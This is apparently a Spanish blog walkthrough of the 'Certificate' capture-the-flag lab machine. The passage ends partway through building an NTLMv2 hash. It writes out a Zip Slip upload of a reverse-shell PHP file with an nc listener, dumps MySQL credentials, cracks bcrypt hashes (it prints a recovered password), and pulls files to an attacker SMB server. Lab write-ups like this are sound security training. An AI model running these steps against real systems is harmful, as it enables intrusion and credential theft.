+                <li>
+                    <a href="#enumeraci%c3%b3n-archivos-usuario-sarab" aria-label="Enumeración archivos usuario sara.b">Enumeración archivos usuario sara.b</a><ul>
+                        
+                <li>
+                    <a href="#file-download" aria-label="File Download">File Download</a></li>
+                <li>
+                    <a href="#enumerando-el-pcap-con-wireshark" aria-label="Enumerando el .pcap con Wireshark">Enumerando el .pcap con Wireshark</a></li>
+                <li>
+                    <a href="#flujode-paquetes-ntlm-dentro-de-smbsmb2" aria-label="Flujode paquetes NTLM dentro de SMB/SMB2">Flujode paquetes NTLM dentro de SMB/SMB2</a></li>
+                <li>
+                    <a href="#construir-hash-ntlmv2" aria-label="Construir HASH NTLMv2">Construir HASH NTLMv2</a></li>
+                <li>
+                    <a href="#kerberos-autentication---krb5roastparser" aria-label="Kerberos autentication - Krb5RoastParser">Kerberos autentication - Krb5RoastParser</a></li></ul>
+                </li>
+                <li>
+                    <a href="#bloodhound-enumeration" aria-label="Bloodhound Enumeration">Bloodhound Enumeration</a><ul>
+                        
+                <li>
+                    <a href="#esc3-enrollment-agent-certificate-template" aria-label="ESC3: Enrollment Agent Certificate Template">ESC3: Enrollment Agent Certificate Template</a></li>
+                <li>
+                    <a href="#enumerando-permisos-del-grupo-domain-storage-managers" aria-label="Enumerando permisos del grupo Domain Storage Managers.">Enumerando permisos del grupo Domain Storage Managers.</a><ul>
+                        
+                <li>
+                    <a href="#explotando-el-privilegio-semanagevolume" aria-label="Explotando el privilegio SeManageVolume">Explotando el privilegio SeManageVolume</a></li></ul>
+                </li>
+                <li>
+                    <a href="#enumerar-y-exportar-certificados-de-ryank---certutil" aria-label="Enumerar y exportar certificados de ryan.k - Certutil">Enumerar y exportar certificados de ryan.k - Certutil</a></li>
+                <li>
+                    <a href="#solicitar-certificado-de-administrador---certipy-forge" aria-label="Solicitar certificado de Administrador - Certipy Forge">Solicitar certificado de Administrador - Certipy Forge</a>
+                </li>
+            </ul>
+            </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><p><img alt="Certificate Machine" loading="lazy" src="/img/certificate/certificate_machine.png"></p>
+<h1 id="reconocimiento-en-red">Reconocimiento en red<a hidden class="anchor" aria-hidden="true" href="#reconocimiento-en-red">#</a></h1>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ sudo nmap -p- --open -sS --min-rate <span class="m">5000</span> -vvv -n -Pn 10.10.11.71 -oG ports
+</span></span><span class="line"><span class="cl"><span class="o">[</span>sudo<span class="o">]</span> contraseña para borhub:
+</span></span><span class="line"><span class="cl">Lo siento, pruebe otra vez.
+</span></span><span class="line"><span class="cl"><span class="o">[</span>sudo<span class="o">]</span> contraseña para borhub:
+</span></span><span class="line"><span class="cl">Host discovery disabled <span class="o">(</span>-Pn<span class="o">)</span>. All addresses will be marked <span class="s1">&#39;up&#39;</span> and scan <span class="nb">times</span> may be slower.
+</span></span><span class="line"><span class="cl">Starting Nmap 7.97 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2025-08-19 19:40 +0200
+</span></span><span class="line"><span class="cl">Initiating SYN Stealth Scan at 19:40
+</span></span><span class="line"><span class="cl">Scanning 10.10.11.71 <span class="o">[</span><span class="m">65535</span> ports<span class="o">]</span>
+</span></span><span class="line"><span class="cl">Discovered open port 80/tcp on 10.10.11.71
+</span></span><span class="line"><span class="cl">Discovered open port 445/tcp on 10.10.11.71
+</span></span><span class="line"><span class="cl">Discovered open port 53/tcp on 10.10.11.71
+</span></span><span class="line"><span class="cl">Discovered open port 135/tcp on 10.10.11.71
+</span></span><span class="line"><span class="cl">Discovered open port 139/tcp on 10.10.11.71
+</span></span><span class="line"><span class="cl">Discovered open port 49666/tcp on 10.10.11.71
+</span></span><span class="line"><span class="cl">Discovered open port 49712/tcp on 10.10.11.71
+</span></span><span class="line"><span class="cl">Discovered open port 49687/tcp on 10.10.11.71
+</span></span><span class="line"><span class="cl">Discovered open port 636/tcp on 10.10.11.71
+</span></span><span class="line"><span class="cl">Discovered open port 49706/tcp on 10.10.11.71
+</span></span><span class="line"><span class="cl">Discovered open port 593/tcp on 10.10.11.71
+</span></span><span class="line"><span class="cl">Discovered open port 49685/tcp on 10.10.11.71
+</span></span><span class="line"><span class="cl">Discovered open port 49731/tcp on 10.10.11.71
+</span></span><span class="line"><span class="cl">Discovered open port 9389/tcp on 10.10.11.71
+</span></span><span class="line"><span class="cl">Discovered open port 88/tcp on 10.10.11.71
+</span></span><span class="line"><span class="cl">Discovered open port 464/tcp on 10.10.11.71
+</span></span><span class="line"><span class="cl">Discovered open port 49686/tcp on 10.10.11.71
+</span></span><span class="line"><span class="cl">Discovered open port 3268/tcp on 10.10.11.71
+</span></span><span class="line"><span class="cl">Discovered open port 3269/tcp on 10.10.11.71
+</span></span><span class="line"><span class="cl">Discovered open port 389/tcp on 10.10.11.71
+</span></span><span class="line"><span class="cl">Completed SYN Stealth Scan at 19:41, 26.35s elapsed <span class="o">(</span><span class="m">65535</span> total ports<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.11.71
+</span></span><span class="line"><span class="cl">Host is up, received user-set <span class="o">(</span>0.037s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Scanned at 2025-08-19 19:40:55 CEST <span class="k">for</span> 26s
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">65515</span> filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+</span></span><span class="line"><span class="cl">PORT      STATE SERVICE          REASON
+</span></span><span class="line"><span class="cl">53/tcp    open  domain           syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">80/tcp    open  http             syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">88/tcp    open  kerberos-sec     syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">135/tcp   open  msrpc            syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">&lt;strong&gt;139/tcp   open  netbios-ssn      syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">&lt;/strong&gt;389/tcp   open  ldap             syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">445/tcp   open  microsoft-ds     syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">464/tcp   open  kpasswd5         syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">593/tcp   open  http-rpc-epmap   syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">636/tcp   open  ldapssl          syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">3268/tcp  open  globalcatLDAP    syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">3269/tcp  open  globalcatLDAPssl syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">9389/tcp  open  adws             syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">49666/tcp open  unknown          syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">49685/tcp open  unknown          syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">49686/tcp open  unknown          syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">49687/tcp open  unknown          syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">49706/tcp open  unknown          syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">49712/tcp open  unknown          syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">49731/tcp open  unknown          syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Read data files from: /usr/bin/../share/nmap
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 26.41 seconds
+</span></span><span class="line"><span class="cl">           Raw packets sent: <span class="m">131063</span> <span class="o">(</span>5.767MB<span class="o">)</span> <span class="p">|</span> Rcvd: <span class="m">30</span> <span class="o">(</span>1.320KB<span class="o">)</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ ports.py ports
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">🔍 Puertos encontrados:
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">53</span>
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">80</span>
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">88</span>
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">135</span>
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">139</span>
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">389</span>
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">445</span>
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">464</span>
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">5</span>
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">593</span>
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">636</span>
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">3268</span>
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">3269</span>
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">9389</span>
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">49666</span>
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">49685</span>
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">49686</span>
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">49687</span>
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">49706</span>
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">49712</span>
+</span></span><span class="line"><span class="cl">  ➜  <span class="m">49731</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">¡Puertos copiados en el portapapeles!
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ sudo nmap -sCV -p 53,80,88,135,139,389,445,464,593,636,3268,3269,9389,49666,49685,49686,49687,49706,49712,49731 10.10.11.71 -oN targeted
+</span></span><span class="line"><span class="cl">Starting Nmap 7.97 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2025-08-19 19:42 +0200
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.11.71
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.12s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT      STATE SERVICE       VERSION
+</span></span><span class="line"><span class="cl">53/tcp    open  domain        Simple DNS Plus
+</span></span><span class="line"><span class="cl">80/tcp    open  http          Apache httpd 2.4.58 <span class="o">(</span>OpenSSL/3.1.3 PHP/8.0.30<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Did not follow redirect to http://certificate.htb/
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.58 <span class="o">(</span>Win64<span class="o">)</span> OpenSSL/3.1.3 PHP/8.0.30
+</span></span><span class="line"><span class="cl">88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server time: 2025-08-20 01:41:57Z<span class="o">)</span>
+</span></span><span class="line"><span class="cl">135/tcp   open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+</span></span><span class="line"><span class="cl">389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: certificate.htb0., Site: Default-First-Site-Name<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: 2025-08-20T01:43:28+00:00<span class="p">;</span> +7h59m38s from scanner time.
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>DC01.certificate.htb
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<span class="p">&amp;</span><span class="c1">#x3C;unsupported&gt;, DNS:DC01.certificate.htb</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2024-11-04T03:14:54
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2025-11-04T03:14:54
+</span></span><span class="line"><span class="cl">445/tcp   open  microsoft-ds?
+</span></span><span class="line"><span class="cl">464/tcp   open  kpasswd5?
+</span></span><span class="line"><span class="cl">593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span class="line"><span class="cl">636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: certificate.htb0., Site: Default-First-Site-Name<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>DC01.certificate.htb
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<span class="p">&amp;</span><span class="c1">#x3C;unsupported&gt;, DNS:DC01.certificate.htb</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2024-11-04T03:14:54
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2025-11-04T03:14:54
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: 2025-08-20T01:43:29+00:00<span class="p">;</span> +7h59m38s from scanner time.
+</span></span><span class="line"><span class="cl">3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: certificate.htb0., Site: Default-First-Site-Name<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: 2025-08-20T01:43:28+00:00<span class="p">;</span> +7h59m38s from scanner time.
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>DC01.certificate.htb
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<span class="p">&amp;</span><span class="c1">#x3C;unsupported&gt;, DNS:DC01.certificate.htb</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2024-11-04T03:14:54
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2025-11-04T03:14:54
+</span></span><span class="line"><span class="cl">3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: certificate.htb0., Site: Default-First-Site-Name<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>DC01.certificate.htb
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<span class="p">&amp;</span><span class="c1">#x3C;unsupported&gt;, DNS:DC01.certificate.htb</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2024-11-04T03:14:54
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2025-11-04T03:14:54
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: 2025-08-20T01:43:29+00:00<span class="p">;</span> +7h59m38s from scanner time.
+</span></span><span class="line"><span class="cl">9389/tcp  open  mc-nmf        .NET Message Framing
+</span></span><span class="line"><span class="cl">49666/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49685/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span class="line"><span class="cl">49686/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49687/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49706/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49712/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49731/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">Service Info: Hosts: certificate.htb, DC01<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Host script results:
+</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-time:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   date: 2025-08-20T01:42:52
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  start_date: N/A
+</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-security-mode:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   3.1.1:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_    Message signing enabled and required
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_clock-skew: mean: 7h59m37s, deviation: 0s, median: 7h59m37s
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 99.37 seconds
+</span></span></code></pre></div><h1 id="enumeración-web">Enumeración web<a hidden class="anchor" aria-hidden="true" href="#enumeración-web">#</a></h1>
+<p>Una vez entramos dentro a la web, vemos que se trata de una plataforma para aprender en linea. En ella también tenemos la capacidad de registrarnos y de iniciar sesión.</p>
+<p><img alt="Certificate Machine 1" loading="lazy" src="/img/certificate/certificate_machine_1.png"></p>
+<p>Una vez iniciamos sesión, vemos que tenemos un nuevo apartado de cursos.</p>
+<p><img alt="Certificate Machine 2" loading="lazy" src="/img/certificate/certificate_machine_2.png"></p>
+<p>Entonces pruebo a pinchar en alguno de los diferentes cursos que vemos y aunque el curso tiene un precio, podemos enrolar el curso para poder hacer-lo.</p>
+<p><img alt="Certificate Machine 3" loading="lazy" src="/img/certificate/certificate_machine_3.png"></p>
+<p>Hecho esto, nos aparece un apartado más abajo con las diferentes clases y algún apartado practico en el cual tenemos que subir el archivo del ejercicio.</p>
+<p><img alt="Certificate Machine 4" loading="lazy" src="/img/certificate/certificate_machine_4.png"></p>
+<h2 id="zip-slip-attack--zip-concatenation">Zip Slip Attack + Zip Concatenation<a hidden class="anchor" aria-hidden="true" href="#zip-slip-attack--zip-concatenation">#</a></h2>
+<p>En este caso vamos a llevar a cabo un ataque <strong>Zip Slip</strong>, que es una vulnerabilidad crítica de directory traversal en operaciones de descompresión de archivos ZIP. La explotación se basa en el hecho de que <strong>la aplicación descomprime archivos sin validar adecuadamente los nombres de los archivos contenidos dentro del ZIP</strong>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">zip pdf.zip ejemplo.pdf
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">python3 zip-slip-exploit-example/evilarc.py -d <span class="m">10</span> -o win revershe_shell.php
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">cat pdf.zip evil.zip &gt; archivos.zip
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">7z l archivos.zip
+</span></span></code></pre></div><p><img alt="Certificate Machine 5" loading="lazy" src="/img/certificate/certificate_machine_5.png"></p>
+<p><img alt="Certificate Machine 6" loading="lazy" src="/img/certificate/certificate_machine_6.png"></p>
+<p><img alt="Certificate Machine 7" loading="lazy" src="/img/certificate/certificate_machine_7.png"></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nc -lvnp <span class="m">4444</span>
+</span></span></code></pre></div><p><img alt="Certificate Machine 8" loading="lazy" src="/img/certificate/certificate_machine_8.png"></p>
+<h2 id="enumeración-de-archivos-del-sistema">Enumeración de archivos del sistema<a hidden class="anchor" aria-hidden="true" href="#enumeración-de-archivos-del-sistema">#</a></h2>
+<p>Al parecer encontramos las credenciales que usa la aplicación web para acceder a la base de datos de mysql:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">type </span><span class="n">db</span><span class="p">.</span><span class="py">php</span>
+</span></span></code></pre></div><p><img alt="Certificate Machine 9" loading="lazy" src="/img/certificate/certificate_machine_9.png"></p>
+<p>Pero si seguimos enumerando, vemos un montón de archivos interesantes para llevar a cabo nuestro siguiente movimiento.</p>
+<p><img alt="Certificate Machine 10" loading="lazy" src="/img/certificate/certificate_machine_10.png"></p>
+<p>Llegamos a la carpeta raíz del servidor xampp, en el cual tenemos archivos interesantes como <code>passwords.txt</code>, <code>C:\xampp\mysql\bin\my.ini</code> y <code>C:\xampp\phpMyAdmin\config.inc.php</code> .</p>
+<p><img alt="Certificate Machine 11" loading="lazy" src="/img/certificate/certificate_machine_11.png"></p>
+<h2 id="enumeración-sql---mysql">Enumeración SQL - Mysql<a hidden class="anchor" aria-hidden="true" href="#enumeración-sql---mysql">#</a></h2>
+<p>Visto esto, parece que para entrar a la base de datos solo necesitamos lo que que sería las credenciales default. Ahora navegamos a la carpeta <code>mysql\bin</code>, en el cual esta el archivo ejecutable de <code>mysql</code>.</p>
+<blockquote>
+<p>En un principio intento que se me abra un prompt donde yo ir escribiendo los comandos, pero al no funcionar-me uso la opción <code>-e</code> para ejecutar las querys que necesito.</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">.\</span><span class="n">mysql</span><span class="p">.</span><span class="py">exe</span> <span class="n">-u</span> <span class="n">root</span> <span class="n">-h</span> <span class="mf">127.0</span><span class="p">.</span><span class="py">0</span><span class="p">.</span><span class="py">1</span> <span class="n">-P</span> <span class="mf">3306</span> <span class="n">-e</span> <span class="s2">&#34;SHOW DATABASES;&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">.\</span><span class="n">mysql</span><span class="p">.</span><span class="py">exe</span> <span class="n">-u</span> <span class="n">root</span> <span class="n">-h</span> <span class="mf">127.0</span><span class="p">.</span><span class="py">0</span><span class="p">.</span><span class="py">1</span> <span class="n">-P</span> <span class="mf">3306</span> <span class="p">-</span><span class="n">-database</span><span class="p">=</span><span class="n">certificate_webapp_db</span> <span class="n">-e</span> <span class="s2">&#34;SHOW TABLES;&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">.\</span><span class="n">mysql</span><span class="p">.</span><span class="py">exe</span> <span class="n">-u</span> <span class="n">root</span> <span class="n">-h</span> <span class="mf">127.0</span><span class="p">.</span><span class="py">0</span><span class="p">.</span><span class="py">1</span> <span class="n">-P</span> <span class="mf">3306</span> <span class="p">-</span><span class="n">-database</span><span class="p">=</span><span class="n">certificate_webapp_db</span> <span class="n">-e</span> <span class="s2">&#34;SELECT * FROM USERS;&#34;</span>
+</span></span></code></pre></div><p><img alt="Certificate Machine 12" loading="lazy" src="/img/certificate/certificate_machine_12.png"></p>
+<p>Nos copiamos todo el listado y lo metemos en el archivo <code>sql_users</code>. Y ahora para craquear los hashes, vamos crear un archivo con solo los usuarios y los hashes separados por <code>:</code> haciendo uso de <code>regex</code>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">cat sql_users <span class="p">|</span> awk <span class="s1">&#39;NR&gt;1 {print 4$, $6}&#39;</span> <span class="p">|</span> tr <span class="s2">&#34; &#34;</span> <span class="s2">&#34;:&#34;</span> &gt; hashes
+</span></span></code></pre></div><table>
+  <thead>
+      <tr>
+          <th>Opción</th>
+          <th>Descripción</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><code>awk 'NR&gt;1 {print 4$, $6}'</code></td>
+          <td>Con <code>NR&gt;1</code> dejamos de mostrar la primera linea.<!-- raw HTML omitted --><!-- raw HTML omitted -->Con <code>{print $4, $6}</code> mostramos solo las columnas 4 y 6.</td>
+      </tr>
+      <tr>
+          <td>tr &quot;  &quot;  &ldquo;:&rdquo;</td>
+          <td>Cambiamos los espacios por :</td>
+      </tr>
+  </tbody>
+</table>
+<p><img alt="Certificate Machine 13" loading="lazy" src="/img/certificate/certificate_machine_13.png"></p>
+<p>Ahora vamos a creackear los hashes, aunque nuestro objetivo es el usuario <code>sara.b</code> . Primero, identificamos el hash como <code>bcrypt</code> y así sabemos que tenemos que usar el tipo de hash 3200 en hashcat.</p>
+<p><img alt="Certificate Machine 14" loading="lazy" src="/img/certificate/certificate_machine_14.png"></p>
+<p>Y ahora ejecutamos el crackeo con la opción <code>--username</code> para indicar que hemos añadido los usuarios en el archivo con los hash.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">hashcat -m <span class="m">3200</span> --force --username -a <span class="m">0</span> hashes /usr/share/SecLists/Password/Leaked-Databases/rockyou.txt
+</span></span></code></pre></div><p><img alt="Certificate Machine 15" loading="lazy" src="/img/certificate/certificate_machine_15.png"></p>
+<p>Y así obtenemos el hash para nuestro usuario objetivo <code>sara.b:Blink182</code>.  Comprobación de credenciales:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nxc winrm 10.10.11.71 -u sara.b -p Blink182
+</span></span></code></pre></div><p><img alt="Certificate Machine 16" loading="lazy" src="/img/certificate/certificate_machine_16.png"></p>
+<h1 id="enumeración-archivos-usuario-sarab">Enumeración archivos usuario sara.b<a hidden class="anchor" aria-hidden="true" href="#enumeración-archivos-usuario-sarab">#</a></h1>
+<p>Con evil-winrm nos abrimos la shell de sara.b para seguir enumerando las carpetas. De momento no tenemos la userflag pero descubrimos un <code>mensaje</code> y un archivo <code>.pcap</code> relacionado con el equipo <code>WS-01</code>.</p>
+<p><img alt="Certificate Machine 17" loading="lazy" src="/img/certificate/certificate_machine_17.png"></p>
+<p>Y aquí el mensaje sobre los problemas que están teniendo:</p>
+<p><img alt="Certificate Machine 18" loading="lazy" src="/img/certificate/certificate_machine_18.png"></p>
+<h2 id="file-download">File Download<a hidden class="anchor" aria-hidden="true" href="#file-download">#</a></h2>
+<p>Ahora nos montamos un servidor SMB en nuestra máquina atacante para así descargarnos el archivo <code>.pcap</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">#Maquina atacante</span>
+</span></span><span class="line"><span class="cl">sudo smbserver.py smbFolder <span class="k">$(</span><span class="nb">pwd</span><span class="k">)</span> -smb2support -username borhub -password borhubpass
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c">#Maquina victima</span>
+</span></span><span class="line"><span class="cl"><span class="n">net</span> <span class="n">use</span> <span class="n">x:</span> <span class="p">\\</span><span class="mf">10.10</span><span class="p">.</span><span class="py">14</span><span class="p">.</span><span class="mf">214</span><span class="p">\</span><span class="n">smbFolder</span> <span class="p">/</span><span class="n">user</span><span class="err">:</span><span class="n">borhub</span> <span class="n">borhubpass</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">copy </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">Sara</span><span class="p">.</span><span class="n">B</span><span class="p">\</span><span class="n">Documents</span><span class="p">\</span><span class="n">WS</span><span class="p">-</span><span class="mf">01</span><span class="p">\</span><span class="n">WS</span><span class="p">-</span><span class="n">01_PktMon</span><span class="p">.</span><span class="py">pcap</span> <span class="n">x:</span><span class="p">\</span><span class="n">WS</span><span class="p">-</span><span class="n">01_PktMon</span><span class="p">.</span><span class="py">pcap</span>
+</span></span></code></pre></div><p><img alt="Certificate Machine 19" loading="lazy" src="/img/certificate/certificate_machine_19.png"></p>
+<h2 id="enumerando-el-pcap-con-wireshark">Enumerando el .pcap con Wireshark<a hidden class="anchor" aria-hidden="true" href="#enumerando-el-pcap-con-wireshark">#</a></h2>
+<p>Una vez abrimos el archivo <code>.pcap</code> con <code>Wireshark</code> , vemos muchos tipos de protocolos que esta vez no nos interesan.</p>
+<p><img alt="Certificate Machine 20" loading="lazy" src="/img/certificate/certificate_machine_20.png"></p>
+<p>Nosotros estamos buscando las comunicaciones de autenticación NTLM que hayan dentro del archivo, con lo cual filtramos por el protcolo <code>NTLMSSP</code>.</p>
+<p><img alt="Certificate Machine 21" loading="lazy" src="/img/certificate/certificate_machine_21.png"></p>
+<p>Y ya rápidamente observamos lo que sería el paquete de autenticación (AUTH) dentro de una Session Setup Request de SMB2</p>
+<h2 id="flujode-paquetes-ntlm-dentro-de-smbsmb2">Flujode paquetes NTLM dentro de SMB/SMB2<a hidden class="anchor" aria-hidden="true" href="#flujode-paquetes-ntlm-dentro-de-smbsmb2">#</a></h2>
+<p>Antes de seguir con el pentest, me parece interesante entender que tenemos enfrente. Para ello vamos a explicar paso a paso que significa cada paquete que hemos visto en el archivo.</p>
+<p><img alt="Certificate Machine 22" loading="lazy" src="/img/certificate/certificate_machine_22.png"></p>
+<h2 id="construir-hash-ntlmv2">Construir HASH NTLMv2<a hidden class="anchor" aria-hidden="true" href="#construir-hash-ntlmv2">#</a></h2>
+<p>Ahora que ya sabemos lo que esta ocurriendo en los paquetes, vamos a proceder con los requisitos.</p>
+<blockquote>
+<p>NT Proof son los primeros 16bytes (32 hex) de la respuesta NTLM en el paquete AUTH.</p>
